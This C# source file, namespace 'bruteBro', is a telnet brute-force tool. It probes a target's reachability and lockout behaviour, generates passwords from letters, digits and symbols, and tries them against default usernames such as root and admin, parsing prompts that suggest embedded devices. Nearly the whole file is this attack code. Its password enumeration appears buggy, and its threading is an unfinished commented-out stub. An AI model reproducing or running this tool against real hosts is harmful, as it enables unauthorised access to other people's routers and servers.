using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Net.Sockets;
using System.Net;
using System.Net.NetworkInformation;
using System.IO;

namespace bruteBro
{
    public static class ObjectManager
    {
        public enum TELNET_RESPONSE : int
        {
            LOGIN_SUCCES = 0,
            LOGIN_FAILED = 1,
            NO_RESPONSE = 2,
            NO_USERNAME = 3,
            NO_PASSWORD = 4

        }

        private static List<NetworkInterface> _networkAdapter = new List<NetworkInterface>();

        public static List<NetworkInterface> NetworkAdapter
        {
            get { return _networkAdapter; }
            set { _networkAdapter = value; }
        }

        private static NetworkInterface _selectedNetworkAdapter = null;

        public static NetworkInterface SelectedNetworkAdapter
        {
            get { return _selectedNetworkAdapter; }
            set { _selectedNetworkAdapter = value; }
        }

        private static IPAddress _ipAddr = null;
        private static int _port = 0;

        private static int _maximumLogonTries = 1;//einer wird wohl immer funktionieren also ein logon

        private static string[] telnetLoginMessages = new string[3] { "(none) login:", "Password:", "Login incorrect" };

        private static string[] _letters = new string[] { "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z" };
        private static int[] _numbers = new int[] { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9 };
        private static string[] _specialsign = new string[] { "^", "!", "\"", "§", "$", "%", "&", "/", "(", ")", "=", "?", "´", "`", "{", " }", @"\", "~", "#", "'", "*", "+", "-", "_", ".", ",", ":", ";", ">", "<", "|" };
        private static string[] _selectedSigns = new string[] { };

        private static int _passwordLength = -1;
        private static double _possibilities = 0.0;
        private static int _workingThreads = 10;

        private static string[] _knownUserName = new string[] { "root", "admin", "Admin", "Root", "Sysadmin", "sysadmin" };
        private static string _password = null;

        public static string[] Letters
        {
            get { return _letters; }
        }
        public static string[] Specialsign
        {
            get { return _specialsign; }
        }
        public static int[] Numbers
        {
            get { return _numbers; }
        }
        public static string[] SelectedSigns
        {
            get { return _selectedSigns; }
        }
        public static IPAddress IpAddr
        {
            get { return _ipAddr; }
        }
        public static int Port
        {
            get { return _port; }
        }
        public static int WorkingThreads
        {
            get { return _workingThreads; }
            set { _workingThreads = value; }
        }
        public static int PasswordLength
        {
            get { return _passwordLength; }
            set { _passwordLength = value; }
        }
        public static double Possibilities
        {
            get { return _possibilities; }
            set { _possibilities = value; }
        }

        private static List<ThreadObject> _threads = new List<ThreadObject>();
        public static List<ThreadObject> ThreadO
        {
            get { return _threads; }
            set { _threads = value; }
        }
        private static List<LoginObject> _loginAttempt = new List<LoginObject>();
        public static List<LoginObject> LoginAttempt
        {
            get { return _loginAttempt; }
            set { _loginAttempt = value; }
        }

        public static List<NetworkInterface> GetNetworkIntegratedCards()
        {
            List<NetworkInterface> response = new List<NetworkInterface>();
            foreach(NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
            {
                if(nic.NetworkInterfaceType == NetworkInterfaceType.Ethernet || nic.NetworkInterfaceType == NetworkInterfaceType.Wireless80211)
                {
                    response.Add(nic);
                }

                
            }
            return response;
        }

        private static void Init(int passwordLength,int workingThreadSize = 10)
        {
            if(passwordLength <= 0)
            {
                throw new Exception("Password lenght muss be more than 0.");
            }
            if (workingThreadSize <= 0)
            {
                throw new Exception("WorkingThreadSize lenght muss be more than 0.");
            }
            _passwordLength = passwordLength;
            _workingThreads = workingThreadSize;

            _selectedSigns = new string[(_letters.Length + _letters.Length + _numbers.Length + _specialsign.Length)];
            for (int i = 0; i < _letters.Length; i++)
            {
                _selectedSigns[i] = _letters[i];
                _selectedSigns[i + _letters.Length] = _letters[i].ToUpper();
            }
            int offset = _letters.Length + _letters.Length;
            for (int i = 0; i < _numbers.Length; i++)
            {
                _selectedSigns[offset + i] = _numbers[i].ToString();
            }
            offset += _numbers.Length;
            for (int i = 0; i < _specialsign.Length; i++)
            {
                _selectedSigns[(offset) + i] = _specialsign[i].ToString();
            }
            _possibilities = (Math.Pow(_selectedSigns.Length, _passwordLength));
        }

        public static bool DestinationReachable(IPAddress addr,int port = -1)
        {
            if (addr == null)
                return false;

            if (port >= 65536 || port < 0)
                return false;

            if(port == -1)
            {
                try
                {
                    Ping pingTry = new Ping();
                    PingOptions pingOptions = new PingOptions(64, true);

                    PingReply reply = pingTry.Send(addr,6000,new byte[64],pingOptions);
                    if(IPStatus.Success == reply.Status)
                    {
                        return true;
                    }
                    else
                        return false;
                }
                catch(Exception ex)
                {
                    return false;
                }
            }
            else//prüfung mit port
            {
                try
                {
                    Ping pingTry = new Ping();
                    PingOptions pingOptions = new PingOptions(64, true);

                    PingReply reply = pingTry.Send(addr, 6000, new byte[64], pingOptions);
                    if (IPStatus.Success == reply.Status)
                    {
                        try
                        {
                            TcpClient tcpClient = new TcpClient();
                            tcpClient.Connect(addr,port);
                            if(tcpClient.Client.Connected)
                            {
                                return true;
                            }
                            else
                                return false;
                        }
                        catch(Exception tcpex)
                        {
                            return false;
                        }
                    }
                    else
                        return false;
                }
                catch (Exception ex)
                {
                    return false;
                }
            }
        }
        public static bool DestinationReachable(string addr, int port = -1)
        {
            if (String.IsNullOrEmpty(addr))
                return false;

            IPAddress ipAddress = null;

            if (!IPAddress.TryParse(addr, out ipAddress))
                return false;

            return DestinationReachable(ipAddress,port);
        }

        public static int GetMaximumLogonTryCount(string addr, int port)
        {
            if (String.IsNullOrEmpty(addr))
                return 0;

            IPAddress ipAddress = null;

            if (!IPAddress.TryParse(addr, out ipAddress))
                return 0;

            return GetMaximumLogonTryCount(ipAddress, port);
        }

        public static int GetMaximumLogonTryCount(IPAddress addr, int port)
        {
            if (addr == null)
                return -1;

            if (port >= 65536 || port < 0)
                return -1;


            string userName = null;
            string passWord = null;

            for (int i = 0; i < 8; i++)
            {
                Random random = new Random();
                int randLetter = random.Next(0, _letters.Length);
                userName += _letters[randLetter];
                randLetter = random.Next(0, _letters.Length);
                passWord += _letters[randLetter];
            }

            int logonTriggerCount = 0;

            TcpClient tcpClient = new TcpClient();
            tcpClient.Connect(addr, port);
            NetworkStream dataStream = tcpClient.GetStream();

            byte[] getData = new byte[4096];
            do
            {
                int length = dataStream.Read(getData, 0, getData.Length);
                string responseString = ASCIIEncoding.Default.GetString(getData, 0, length);
                if (!String.IsNullOrEmpty(responseString))
                {
                    string[] responses = responseString.Split(new string[] { "\r\n" }, StringSplitOptions.None);
                    if (responses.Length != 0)
                    {
                        for (int i = 0; i < responses.Length; i++)
                        {
                            responses[i] = responses[i].Trim('\r', '\n', ' ');

                            string clicommand = null;
                            byte[] writeData = new byte[] { };

                            if (responses[i] == "(none) login:")
                            {
                                clicommand = userName + "\r\n";
                                writeData = Encoding.ASCII.GetBytes(clicommand);
                                dataStream.Write(writeData, 0, writeData.Length);
                            }
                            else if (responses[i] == "Password:")
                            {
                                clicommand = passWord + "\r\n";
                                writeData = Encoding.ASCII.GetBytes(clicommand);
                                dataStream.Write(writeData, 0, writeData.Length);
                            }
                            else if (responses[i] == "Login incorrect")
                            {
                                logonTriggerCount++;
                            }
                            else if (responses[i] == "Login correct")
                            {
                                logonTriggerCount++;
                            }
                        }
                    }
                }
                else
                {
                    tcpClient.Close();
                }
            }
            while (tcpClient.Connected);

            return logonTriggerCount;
        }

        public static bool BruteForce(int passwordLength,string ipAddr, int port, IProgress<int> progress = null)
        {
            if (String.IsNullOrEmpty(ipAddr))
                return false;

            IPAddress ipAddress = null;
            if (!IPAddress.TryParse(ipAddr,out ipAddress))
                return false;

            _ipAddr = ipAddress;
            _port = port;

            if (_passwordLength == -1)
                Init(passwordLength);

            _password = "";
            int possibilityCounter = 0;
            int rowCounter = 0;
            int pos = 0;
            if (_password.Length < 1)
            {
                for (int i = 0; i < _passwordLength; i++)
                {
                    _password += _selectedSigns[0];
                }
            }
            while (rowCounter < (_passwordLength))
            {
                for (int i = 0; i < _passwordLength; i++)
                {
                    for (int s = 0; s < _selectedSigns.Length; s++)
                    {
                        StringBuilder strBuilder = new StringBuilder(_password);
                        int varCountbEFORE = (i - 1 >= 0) ? (i - 1) : (0);
                        strBuilder.Remove(varCountbEFORE, 1);
                        strBuilder.Insert((varCountbEFORE), _selectedSigns[pos]);
                        int varCountnEXT = (i + 1 < _passwordLength) ? (i + 1) : (_passwordLength - 1);
                        strBuilder.Remove(varCountnEXT, 1);
                        strBuilder.Insert(varCountnEXT, _selectedSigns[s]);
                        if (s >= _selectedSigns.Length - 1)
                        {
                            pos++;
                            if ((pos) >= _selectedSigns.Length)
                            {
                                pos = 0;
                                rowCounter++;
                            }
                        }
                        for (int u = 0; u < _knownUserName.Length; u++)
                        {
                            _loginAttempt.Add(new LoginObject { User = _knownUserName[u], Password = strBuilder.ToString() });
                            int idLoginTry = _loginAttempt.Count - 1;

                            AttemtTelNetLogin(idLoginTry, _ipAddr,_port);

                            /*if(_threads.Count < _workingThreads)
                            {
                                Thread startThread = new Thread(()=> 
                                {
                                    //hier noch action rein problem noch kp wie ich aus der instanz auf die threadobject arrays zugreife um bsp. threads die durchlaufen sind mit dem bool inusefree = false
                                });

                                _threads.Add(new ThreadObject { ThreadO = startThread, ThreadInUse = false });
                            }
                            else//warten bis ein thread erledigt ist
                            {
                                bool selectFreeThread = true;
                                while(selectFreeThread)
                                {
                                    for (int t = 0; t < _threads.Count; t++)
                                    {

                                    }
                                }
                            }*/

                        }
                        possibilityCounter++;
                        progress.Report(possibilityCounter);

                    }
                }
            }
            return true;
        }

        private static TELNET_RESPONSE AttemtTelNetLogin(int index,IPAddress addr,int port)
        {
            if (_loginAttempt == null)
                return TELNET_RESPONSE.NO_RESPONSE;

            if (index >= _loginAttempt.Count)
            {
                return TELNET_RESPONSE.NO_RESPONSE;
            }

            int id = index;
            string userName = _loginAttempt[id].User;
            string passWord = _loginAttempt[id].Password;

            if (userName == null)
                return TELNET_RESPONSE.NO_USERNAME;

            if (passWord == null)
                return TELNET_RESPONSE.NO_PASSWORD;

            try
            {
                TcpClient tcpClient = new TcpClient();
                tcpClient.Connect(addr, port);
                NetworkStream dataStream = tcpClient.GetStream();

                byte[] getData = new byte[4096];
                bool runComplete = false;
                bool loggedIn = false;
                do
                {
                    int length = dataStream.Read(getData, 0, getData.Length);
                    string responseString = ASCIIEncoding.Default.GetString(getData, 0, length);
                    if (!String.IsNullOrEmpty(responseString))
                    {
                        string[] responses = responseString.Split(new string[] { "\r\n" }, StringSplitOptions.None);
                        if (responses.Length != 0)
                        {
                            for (int i = 0; i < responses.Length; i++)
                            {
                                responses[i] = responses[i].Trim('\r', '\n', ' ');

                                string clicommand = null;
                                byte[] writeData = new byte[] { };

                                if (responses[i] == "(none) login:")
                                {
                                    clicommand = userName + "\r\n";
                                    _loginAttempt[id].Request = clicommand;
                                    _loginAttempt[id].ResponseDateTime = DateTime.Now;
                                    writeData = Encoding.ASCII.GetBytes(clicommand);
                                    dataStream.Write(writeData, 0, writeData.Length);
                                }
                                else if (responses[i] == "Password:" && id != -1)
                                {
                                    clicommand = passWord + "\r\n";
                                    _loginAttempt[id].Request += clicommand;
                                    writeData = Encoding.ASCII.GetBytes(clicommand);
                                    dataStream.Write(writeData, 0, writeData.Length);
                                }
                                else if (responses[i] == "Login incorrect" & id != -1)
                                {
                                    _loginAttempt[id].Request += clicommand;
                                    _loginAttempt[id].Response = responses[i];
                                    _loginAttempt[id].ResponseDateTime = DateTime.Now;
                                    _loginAttempt[id].Executed = true;
                                    tcpClient.Close();
                                    tcpClient.Dispose();
                                    runComplete = true;
                                    loggedIn = false;
                                }
                                else if (responses[i] == "Login correct" & id != -1)
                                {
                                    _loginAttempt[id].Request += clicommand;
                                    _loginAttempt[id].Response = responses[i];
                                    _loginAttempt[id].ResponseDateTime = DateTime.Now;
                                    _loginAttempt[id].Executed = true;
                                    _loginAttempt[id].LoggedIn = true;
                                    tcpClient.Close();
                                    tcpClient.Dispose();
                                    runComplete = true;
                                    loggedIn = true;
                                }
                            }
                        }
                    }
                }
                while (!runComplete);
                if(loggedIn)
                {
                    return TELNET_RESPONSE.LOGIN_SUCCES;
                }
                else
                {
                    return TELNET_RESPONSE.LOGIN_FAILED;
                }
            }
            catch (Exception ex)
            {
                int x = 0;
            }
            return TELNET_RESPONSE.NO_RESPONSE;
        }
    }
}
